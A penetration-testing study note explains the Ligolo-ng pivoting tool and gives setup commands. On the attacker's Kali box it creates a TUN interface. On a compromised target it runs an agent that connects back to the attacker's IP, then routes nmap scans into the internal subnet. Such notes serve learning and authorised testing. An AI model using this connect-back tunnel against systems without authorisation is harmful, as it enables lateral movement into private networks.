# Ligolo-ng

Modern pivoting/tunneling tool that creates a real TUN network interface on the attacker box instead of a SOCKS proxy, meaning tools like `nmap` can run directly against the pivoted network with no `proxychains` wrapper needed at all.

> **No current module cross-link yet.** Same situation as [[Chisel]], pivoting isn't covered in the 7 modules swept so far. Included since it's a natural companion to Chisel and directly relevant to the tooling category this sweep was asked to cover, will get wired into a real module section once pivoting content comes up.

---

## What it would replace, and why it's faster

Where [[Chisel]] (or manual SSH tunneling) gives you a SOCKS proxy that every tool has to be explicitly routed through via `proxychains` (which itself is a common source of flaky/slow behavior, some tools don't play nicely with it), Ligolo-ng creates an actual virtual network interface using a userland network stack (gVisor). Once a route is added, traffic to the pivoted network just works, transparently, for any tool, without needing `proxychains` at all.

## Install

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
# or grab a pre-built binary from the Releases page for both proxy (attacker) and agent (target)
```

## Usage

```bash
# On Kali (attacker), start the proxy and create the TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On the compromised target, run the agent, connecting back to the proxy
./agent -connect <kali_ip>:11601 -ignore-cert

# Back on Kali, inside the ligolo-ng console: select the session, then add the route
session
ifconfig                          # confirm the target's internal interface/subnet
start                             # begins relaying traffic through the TUN interface
```
```bash
# Then, in a separate terminal, add a route to the newly-reachable subnet
sudo ip route add <internal_subnet>/24 dev ligolo
```
*Once the route's added, tools just work against the internal subnet directly, `nmap -sT <internal_target>` with no `proxychains` prefix needed, since the traffic genuinely routes through the real `ligolo` TUN interface rather than being SOCKS-proxied per-application.*

#### Tags: #ModernTooling #LigoloNg #Pivoting #Tunneling #TunInterface
